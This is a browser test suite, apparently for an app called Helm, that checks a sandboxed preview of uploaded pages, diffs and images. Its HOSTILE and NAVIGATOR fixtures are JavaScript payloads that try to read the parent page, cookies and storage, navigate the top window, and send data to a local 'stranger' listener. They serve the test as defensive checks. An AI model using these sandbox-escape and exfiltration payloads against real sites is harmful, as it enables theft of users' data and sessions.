"""A run's page, diff and screenshot open from the card, and a hostile page gets nowhere (browser).

Run: PLAYWRIGHT_BROWSERS_PATH=~/.cache/ms-playwright python3 tests/test_screens_run_preview.py

The run-preview directive (2026-10-14). The app comes up on loopback from synthetic data
(tools/screens/fixture.py); every file here is invented. An agent uploads a page, a diff, a screenshot
and a text file to a card the way the client's report script will (the api role, bearer), and headless
Chromium opens the card through the web role with X-Forwarded-User set, at 999x1392 and on a
Pixel 7 profile:

  * the card offers the file: the timeline's Open button and the Attachments row's Preview page,
    View changes, View text, and the image's lightbox;
  * a page opens in a frame that carries exactly sandbox="allow-scripts", and it RUNS (a benign page's
    script and style both take effect: a preview that cannot run its own script is not the page);
  * a hostile page tries parent.document, top.document, parent.Helm, localStorage, sessionStorage,
    document.cookie, indexedDB, window.open, top navigation, fetch to Helm and to a stranger, XHR,
    a WebSocket, sendBeacon, an image beacon, a form post, a stylesheet link, eval and a nested
    frame; every one fails, the page it sits in is unchanged, and an outside listener on a second
    port (the "stranger") hears nothing, while the same listener does hear the unsandboxed page, so
    a silent listener means something;
  * "Open full screen" is the same URL and the policy comes with it: opened as a tab of its own the
    hostile page fails the same way;
  * a diff is coloured lines (added, removed, hunks) built from text, never from HTML;
  * Esc, the close button and the phone's back button close the viewer and leave the card open.

Playwright and Chromium are required (CI installs them); HELM_SKIP_DRIVES=1 skips this suite
deliberately, which reports one failed check so a skipped run never reads as green.
"""
from __future__ import annotations

import base64
import http.server
import json
import os
import sys
import threading
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "tools", "screens"))
sys.path.insert(0, HERE)

passed = failed = 0


def check(name, cond, detail=""):
    global passed, failed
    if cond:
        passed += 1
        print("  ok   " + name)
    else:
        failed += 1
        print("  FAIL " + name + ("  <- " + str(detail)[:400] if detail else ""))


if os.environ.get("HELM_SKIP_DRIVES") == "1":
    check("the Playwright drives ran (HELM_SKIP_DRIVES=1 set: skipped deliberately)", False)
    print(f"{passed} passed, {failed} failed")
    sys.exit(1)

import fixture  # noqa: E402
import shoot  # noqa: E402
from playwright.sync_api import sync_playwright  # noqa: E402
from test_screens_drive import HEADERS, WIDE, Drive, api  # noqa: E402

# ---------------------------------------------------------------- the stranger on another port
HITS = []


class Stranger(http.server.BaseHTTPRequestHandler):
    def _hit(self):
        HITS.append("%s %s" % (self.command, self.path))
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    do_GET = do_POST = do_HEAD = do_OPTIONS = _hit

    def log_message(self, *a):
        pass


srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Stranger)
STRANGER = "http://127.0.0.1:%d" % srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()

# ---------------------------------------------------------------- synthetic files
BENIGN = ("<!doctype html><meta charset=utf-8><title>Synthetic report</title>"
          "<style>#r{color:rgb(0,128,0);font-weight:700}</style><h1 id=h>Synthetic run report</h1>"
          "<p id=r>Pine Hollow portal, ticket 00100001 (fictional).</p>"
          "<script>document.getElementById('h').textContent='script ran';"
          "parent.postMessage({benign:{ran:true,color:getComputedStyle(document.getElementById('r')).color}},'*')</script>")

HOSTILE = """<!doctype html><meta charset=utf-8><title>hostile</title><p id=m>hostile page loaded</p>
<form id=f method=post action="%(S)s/form"><input name=x value=1></form>
<script>
const R = {}, S = "%(S)s", V = [];
document.addEventListener("securitypolicyviolation", (e) => V.push(e.violatedDirective.split(" ")[0]));
function t(name, fn) { try { const v = fn(); R[name] = (v === null || v === undefined || v === false) ? "blocked" : "ALLOWED " + String(v).slice(0, 60); } catch (e) { R[name] = "blocked " + e.name; } }
t("parent.document", () => parent.document.title);
t("top.document", () => top.document.body.innerHTML.length);
t("parent.Helm", () => parent.Helm.previewAttachment);
t("parent.localStorage", () => parent.localStorage.length);
t("localStorage", () => localStorage.getItem("helm.drafts"));
t("sessionStorage", () => sessionStorage.length);
t("document.cookie", () => document.cookie.length >= 0 ? "readable" : "");
t("indexedDB", () => indexedDB.open("x") ? "opened" : "");
t("window.open", () => window.open(S + "/popup"));
t("top.location assign", () => { top.location = S + "/top"; return "navigated"; });
t("top.location read", () => top.location.href);
t("eval", () => eval("1+1"));
t("Function", () => new Function("return 1")());
t("nested frame", () => { const i = document.createElement("iframe"); i.src = S + "/nested"; document.body.append(i); return "added"; });
t("img beacon", () => { new Image().src = S + "/img"; return "sent"; });
t("stylesheet", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = S + "/css"; document.head.append(l); return "added"; });
t("script tag", () => { const s = document.createElement("script"); s.src = S + "/js"; document.head.append(s); return "added"; });
t("form submit", () => { document.getElementById("f").submit(); return "submitted"; });
t("sendBeacon", () => navigator.sendBeacon(S + "/beacon", "x"));
t("WebSocket", () => { const w = new WebSocket(S.replace("http", "ws") + "/ws"); return "opened"; });
t("same-origin nav of top via link", () => { const a = document.createElement("a"); a.href = "/"; a.target = "_top"; document.body.append(a); a.click(); return "clicked"; });
const pend = [];
function a(name, p) { pend.push(p.then(() => { R[name] = "ALLOWED"; }, (e) => { R[name] = "blocked " + e.name; })); }
a("fetch helm", fetch("/api/triage/threads?hostile=1", { credentials: "include" }));
a("fetch helm no-cors", fetch("/api/triage/threads?hostile=2", { mode: "no-cors", credentials: "include" }));
a("fetch stranger", fetch(S + "/fetch", { mode: "no-cors" }));
a("fetch stranger cors", fetch(S + "/fetch-cors"));
a("xhr", new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", S + "/xhr"); x.onload = ok; x.onerror = () => no(new Error("xhr")); try { x.send(); } catch (e) { no(e); } }));
Promise.all(pend).then(() => setTimeout(() => parent.postMessage({hostile: R, violations: [...new Set(V)].sort()}, "*"), 800));
</script>""" % {"S": STRANGER}


NAVIGATOR = """<!doctype html><meta charset=utf-8><title>navigator</title><p>about to navigate its own frame</p>
<script>setTimeout(() => { location = "%(S)s/nav?held=" + encodeURIComponent("what the page held"); }, 200);
setTimeout(() => parent.postMessage({navigator: "ran"}, "*"), 50);</script>""" % {"S": STRANGER}

DIFF = ("diff --git a/notes.txt b/notes.txt\nindex 1111111..2222222 100644\n--- a/notes.txt\n+++ b/notes.txt\n"
        "@@ -1,3 +1,3 @@\n keep this line\n-the old line <b>not bold</b>\n+the new line <b>not bold</b>\n unchanged\n"
        "diff --git a/other.txt b/other.txt\n--- a/other.txt\n+++ b/other.txt\n@@ -5 +5,2 @@\n-gone\n+here\n+and here\n")
TEXT = "A plain note.\nSecond line with <i>no markup</i>.\n"


def upload(site, tid, name, mime, data):
    return api(site, "/api/triage/threads/%s/attach" % tid, {
        "filename": name, "mime": mime, "uploader": "agent", "caption": "built by the synthetic run",
        "content_base64": base64.b64encode(data).decode()})


def seed(site, tid):
    api(site, "/api/triage/threads", {"threads": [{
        "thread_id": tid, "title": "Synthetic run: page, diff and shot", "summary": "A fictional run built a page, a diff and a screenshot.",
        "category": "Test", "urgency": "whenever", "state": "needs-you", "responder": "sweep:test",
        "ask": {"kind": "ack", "prompt": "Open the page and close the card", "requires": ["decision"],
                "options": [{"label": "Got it", "value": "ack", "effect": "Closes the card"}]},
        "sources": [{"source": "test", "id": tid}],
        "events": [{"ts": __import__("time").time() - 600, "source": "sweep:test", "kind": "bot-result", "body": "The run built three things."}]}]}, "PUT")
    out = {}
    out["benign"] = upload(site, tid, "report.html", "text/html", BENIGN.encode())["att_id"]
    out["hostile"] = upload(site, tid, "hostile.html", "text/html", HOSTILE.encode())["att_id"]
    out["diff"] = upload(site, tid, "change.patch", "text/x-diff", DIFF.encode())["att_id"]
    out["text"] = upload(site, tid, "notes.txt", "text/plain", TEXT.encode())["att_id"]
    out["png"] = upload(site, tid, "screenshot.png", "image/png", fixture.png(320, 160))["att_id"]
    out["navigator"] = upload(site, tid, "navigator.html", "text/html", NAVIGATOR.encode())["att_id"]
    return out


def messages(d):
    return d.eval("window.__pv.splice(0)")


LAST = {}   # the whole message a key arrived in


def wait_msg(d, key, timeout=15000):
    d.page.wait_for_function("(k) => window.__pv.some(m => m && m[k])", arg=key, timeout=timeout)
    m = [m for m in messages(d) if m and key in m][0]
    LAST[key] = m
    return m[key]


def open_card(browser, site, tid, ctx_args=None):
    if ctx_args:
        ctx = browser.new_context(**ctx_args, extra_http_headers=HEADERS, locale="en-US")
        page = ctx.new_page()
        page.add_init_script("window.__pv=[];addEventListener('message',e=>window.__pv.push(e.data))")
        page.goto(site.web_url + "/#/threads/" + tid, wait_until="domcontentloaded")
        class D:  # noqa: N801 - the bits of Drive this suite uses
            pass
        d = D(); d.page = page; d.ctx = ctx; d.errors = []
        page.on("pageerror", lambda e: d.errors.append(str(e)))
        d.eval = page.evaluate; d.close = ctx.close
        d.until = lambda js, timeout=20000: (page.wait_for_function(js, timeout=timeout) or True)
        d.hash = lambda: page.evaluate("location.hash")
        return d
    d = Drive(browser, site, WIDE, "#/threads/" + tid, before_goto=lambda c: c.add_init_script(
        "window.__pv=[];addEventListener('message',e=>window.__pv.push(e.data))"))
    return d


def run_site(browser, st, site, label, ctx_args=None):
    print("\n%s" % label)
    tid = "t-rp-" + site.site + ("-phone" if ctx_args else "")
    ids = seed(site, tid)
    d = open_card(browser, site, tid, ctx_args)
    d.page.wait_for_selector(".conv-msg-files .pv-open", timeout=20000)
    reqs = []
    d.ctx.on("request", lambda r: reqs.append(r.url))
    n_open = d.eval("document.querySelectorAll('.conv-msg-files .pv-open').length")
    check("the timeline offers an Open button for each file the run left (6)", n_open == 6, n_open)
    if ctx_args:   # on a phone the properties are a separate screen: the timeline button is the way in
        pass
    # -------------------------------------------------- the benign page runs
    d.page.click(".conv-msg-files .pv-open >> nth=0")
    d.page.wait_for_selector("#preview-ov:not(.hidden) iframe.pv-frame", timeout=15000)
    check("the frame carries exactly sandbox=allow-scripts",
          d.eval("document.querySelector('#preview-ov iframe').getAttribute('sandbox')") == "allow-scripts")
    check("it points at the /view route", d.eval("document.querySelector('#preview-ov iframe').getAttribute('src')").endswith("/view?raw=1"))
    b = wait_msg(d, "benign")
    check("the page's own script ran inside the sandbox", b.get("ran") is True, b)
    check("and its own style applied (green)", b.get("color") == "rgb(0, 128, 0)", b)
    frame = [f for f in d.page.frames if f != d.page.main_frame][0]
    check("the frame shows what the script wrote", frame.evaluate("document.getElementById('h').textContent") == "script ran")
    check("the viewer names the file", "report.html" in d.eval("document.querySelector('#preview-ov .pv-name').textContent"))
    check("and says, in the bar, not to type anything into the page", "Do not type anything into it" in d.eval("document.querySelector('#preview-ov .pv-note').textContent"))
    sw = d.eval("document.documentElement.scrollWidth <= document.documentElement.clientWidth")
    check("no sideways page scroll with the viewer open", sw)
    ov = d.eval("(() => { const r = document.querySelector('#preview-ov').getBoundingClientRect(); return [r.width, r.height, innerWidth, innerHeight]; })()")
    check("the viewer fills the window", abs(ov[0] - ov[2]) < 2 and abs(ov[1] - ov[3]) < 2, ov)
    fr = d.eval("(() => { const r = document.querySelector('#preview-ov iframe').getBoundingClientRect(); return [r.width, innerWidth]; })()")
    check("the frame is as wide as the window", abs(fr[0] - fr[1]) < 2, fr)
    d.page.screenshot(path=os.path.join(os.environ.get("RP_SHOTS", "/tmp"), "rp-%s-page.png" % (site.site + ("-phone" if ctx_args else ""))))
    # fit width
    d.page.click("#preview-ov .pv-btn:has-text('Fit width')")
    tf = d.eval("document.querySelector('#preview-ov iframe').style.transform")
    check("Fit width scales the frame", ("scale(" in tf) if ctx_args else True, tf)
    d.page.click("#preview-ov .pv-btn:has-text('Actual size')")
    check("and Actual size puts it back", d.eval("document.querySelector('#preview-ov iframe').style.transform") == "")
    # Esc closes, card stays
    d.page.keyboard.press("Escape")
    check("Esc closes the viewer and leaves the card open", d.eval("document.querySelector('#preview-ov').classList.contains('hidden')")
          and "/threads/" + tid in d.hash(), d.hash())
    check("closing removes the frame (a running page stops)", d.eval("document.querySelectorAll('#preview-ov iframe').length") == 0)

    # -------------------------------------------------- the hostile page
    messages(d)
    HITS.clear(); reqs.clear()
    d.page.click(".conv-msg-files .pv-open >> nth=1")
    d.page.wait_for_selector("#preview-ov iframe.pv-frame", timeout=15000)
    R = wait_msg(d, "hostile", 25000)
    print("  [hostile results: %s]" % json.dumps(R, sort_keys=True))
    wanted = ["parent.document", "top.document", "parent.Helm", "parent.localStorage", "localStorage", "sessionStorage", "document.cookie",
              "indexedDB", "window.open", "top.location assign", "top.location read", "eval", "Function", "fetch helm", "fetch helm no-cors",
              "fetch stranger", "fetch stranger cors", "xhr"]
    for k in wanted:
        check("hostile: %s fails" % k, str(R.get(k, "")).startswith("blocked"), R.get(k))
    check("hostile: the page it sits in is unchanged (same URL, card still open)", "/threads/" + tid in d.hash())
    V = LAST["hostile"].get("violations", [])
    print("  [policy violations the browser reported inside the frame: %s]" % V)
    for need, what in [("img-src", "the image beacon"), ("connect-src", "fetch, XHR, sendBeacon and the WebSocket"), ("frame-src", "the nested frame"),
                       ("script-src-elem", "the remote script tag"), ("style-src-elem", "the remote stylesheet")]:
        check("hostile: the browser blocked %s (a %s violation)" % (what, need), need in V, V)
    # the form post is stopped by the sandbox itself (no allow-forms): the browser raises no CSP event for it,
    # so its evidence is the stranger's silence, checked below with every other fire-and-forget attempt.
    d.page.wait_for_timeout(800)
    check("the stranger heard nothing from the sandboxed page (no fetch, XHR, beacon, image, form, link, stylesheet, script, frame, socket)",
          HITS == [], HITS)
    bad = [u for u in reqs if "hostile=" in u]
    check("and Helm saw none of its same-origin attempts leave the browser", bad == [], bad)
    check("the hostile frame never navigated the page (no popup page opened)", len(d.ctx.pages) == 1, len(d.ctx.pages))
    check("and never navigated the frame's parent away", d.eval("!!document.querySelector('#preview-ov')") and "/threads/" in d.hash())
    # positive control: an unsandboxed fetch from the page itself does reach the stranger
    d.eval("fetch('%s/control', {mode: 'no-cors'})" % STRANGER)
    d.page.wait_for_timeout(500)
    check("control: the same listener DOES hear an unsandboxed request, so silence above means something", any("/control" in h for h in HITS), HITS)
    HITS.clear()
    # back (phone) / button closes
    d.page.go_back()
    d.page.wait_for_timeout(300)
    check("the back button closes the viewer and stays on the card", d.eval("document.querySelector('#preview-ov').classList.contains('hidden')")
          and "/threads/" + tid in d.hash(), d.hash())

    # -------------------------------------------------- full screen: a tab gets the host page, and the policy travels
    d.page.click(".conv-msg-files .pv-open >> nth=1")
    d.page.wait_for_selector("#preview-ov iframe.pv-frame", timeout=15000)
    href = d.eval("document.querySelector('#preview-ov a.pv-btn[target=_blank]').href")
    check("Open full screen is the file's /view address (the host page, not the page itself)", href.endswith("/attachments/%s/view" % ids["hostile"]), href)
    d.page.keyboard.press("Escape")
    HITS.clear()
    tab = d.ctx.new_page()
    tab.add_init_script("window.__pv=[];addEventListener('message',e=>window.__pv.push(e.data))")
    tab.goto(href, wait_until="domcontentloaded")
    for _ in range(250):   # polled with evaluate: the host page's own policy forbids the string eval wait_for_function needs
        got = [m for m in tab.evaluate("window.__pv") if m and "hostile" in m]
        if got:
            break
        tab.wait_for_timeout(100)
    R2 = got[0]["hostile"]
    for k in wanted:
        check("full screen, hostile: %s fails" % k, str(R2.get(k, "")).startswith("blocked"), R2.get(k))
    check("the tab itself is still on the host page (top navigation attempts went nowhere)", tab.url == href, tab.url)
    check("the tab's top-level document is the host: one sandboxed frame, no script of its own",
          tab.evaluate("document.querySelectorAll('iframe[sandbox=allow-scripts]').length") == 1
          and tab.evaluate("document.querySelectorAll('script').length") == 0)
    tab.wait_for_timeout(800)
    check("and the stranger hears nothing from the tab either", HITS == [], HITS)
    raw = href + "?raw=1"
    tab.goto(raw, wait_until="domcontentloaded")
    check("typing the raw address into a tab gets the host page again, never the page itself",
          tab.evaluate("document.querySelectorAll('iframe[sandbox=allow-scripts]').length") == 1, tab.url)
    tab.close()

    # -------------------------------------------------- the diff
    d.page.click(".conv-msg-files .pv-open >> nth=2")
    d.page.wait_for_selector("#preview-ov .pv-diff", timeout=15000)
    cls = d.eval("[...document.querySelectorAll('#preview-ov .pv-line')].map(e => e.className.replace('pv-line ', ''))")
    check("the diff has added, removed and hunk lines", cls.count("pv-add") == 3 and cls.count("pv-del") == 2 and cls.count("pv-hunk") == 2, cls)
    check("file headers are marked", sum(c.startswith("pv-file") for c in cls) >= 6, cls)
    head = d.eval("document.querySelector('#preview-ov .pv-diff-head').textContent")
    check("the header counts files and lines", "2 files" in head and "+3" in head and "−2" in head, head)
    check("markup in the diff is text, not tags", d.eval("document.querySelectorAll('#preview-ov .pv-diff b').length") == 0
          and "<b>not bold</b>" in d.eval("document.querySelector('#preview-ov .pv-diff').textContent"))
    colors = d.eval("[...document.querySelectorAll('#preview-ov .pv-add, #preview-ov .pv-del')].map(e => getComputedStyle(e).color)")
    check("added and removed lines are drawn in different colours", len(set(colors)) == 2, colors)
    d.page.screenshot(path=os.path.join(os.environ.get("RP_SHOTS", "/tmp"), "rp-%s-diff.png" % (site.site + ("-phone" if ctx_args else ""))))
    d.page.keyboard.press("Escape")

    # -------------------------------------------------- text and image
    d.page.click(".conv-msg-files .pv-open >> nth=3")
    d.page.wait_for_selector("#preview-ov .pv-text", timeout=15000)
    check("a text file shows as text, tags and all", "<i>no markup</i>" in d.eval("document.querySelector('#preview-ov .pv-text').textContent")
          and d.eval("document.querySelectorAll('#preview-ov .pv-text i').length") == 0)
    d.page.keyboard.press("Escape")
    d.page.click(".conv-msg-files .pv-open >> nth=4")
    d.page.wait_for_selector("#lightbox:not(.hidden) #lightbox-img", timeout=15000)
    nat = d.eval("new Promise(r => { const i = document.getElementById('lightbox-img'); if (i.complete) r(i.naturalWidth); else i.onload = () => r(i.naturalWidth); })")
    check("an image opens inline in the lightbox and loads", nat == 320, nat)
    d.page.keyboard.press("Escape")

    # -------------------------------------------------- a page that was closed while its list was loading stays closed
    d.eval("Helm.previewAttachment(%s, %s); Helm.closePreview();" % (json.dumps(tid), json.dumps(ids["benign"])))
    d.page.wait_for_timeout(700)
    check("closing while the file list is still loading leaves the viewer closed", d.eval("document.querySelector('#preview-ov').classList.contains('hidden')"))

    # -------------------------------------------------- the residual: a page can navigate ITS OWN frame
    HITS.clear()
    d.page.click(".conv-msg-files .pv-open >> nth=5")
    d.page.wait_for_selector("#preview-ov iframe.pv-frame", timeout=15000)
    d.page.wait_for_timeout(1500)
    print("  [known residual: the stranger heard %s]" % HITS)
    check("known and documented (G21): a page navigating its own frame DOES reach another address; nothing else of the card moved",
          any("/nav?held=" in h for h in HITS) and "/threads/" + tid in d.hash() and d.eval("!!document.querySelector('#preview-ov')"), HITS)
    check("and the viewer's bar still tells the reader not to type into a page", "Do not type anything into it" in d.eval("document.querySelector('#preview-ov .pv-note').textContent"))
    d.page.keyboard.press("Escape")
    HITS.clear()

    # -------------------------------------------------- the Attachments row (wide screens show properties beside the card)
    if not ctx_args:
        d.page.wait_for_selector("#props-body .sent-file.pv-open", timeout=15000)
        labels = d.eval("[...document.querySelectorAll('#props-body .sent-file.pv-open')].map(e => e.textContent)")
        check("the Attachments row offers Preview page, View changes and View text", sum("Preview page" in l for l in labels) == 3
              and any("View changes" in l for l in labels) and any("View text" in l for l in labels), labels)
        d.page.click("#props-body .sent-file.pv-open:has-text('View changes')")
        d.page.wait_for_selector("#preview-ov .pv-diff", timeout=15000)
        check("a click there opens the same viewer", d.eval("!document.querySelector('#preview-ov').classList.contains('hidden')"))
        d.page.keyboard.press("Escape")
        dl = d.eval("[...document.querySelectorAll('#props-body a.sent-file')].map(a => a.getAttribute('href'))")
        check("and every file keeps its download link", len(dl) >= 4 and all("/attachments/" in h for h in dl), dl)
    check("no script error on the card page the whole time", d.errors == [], d.errors)
    d.close()


def main():
    with fixture.Stack(("home",)) as st, sync_playwright() as p:
        browser = p.chromium.launch(**shoot.launch_args())
        run_site(browser, st, st.home, "work site (the reference app), 999x1392")
        run_site(browser, st, st.home, "work site (the reference app), phone (Pixel 7 profile)", ctx_args=p.devices["Pixel 7"])
        run_site(browser, st, st.home, "home site (Helm), 999x1392")
        browser.close()
    srv.shutdown()
    print(f"{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
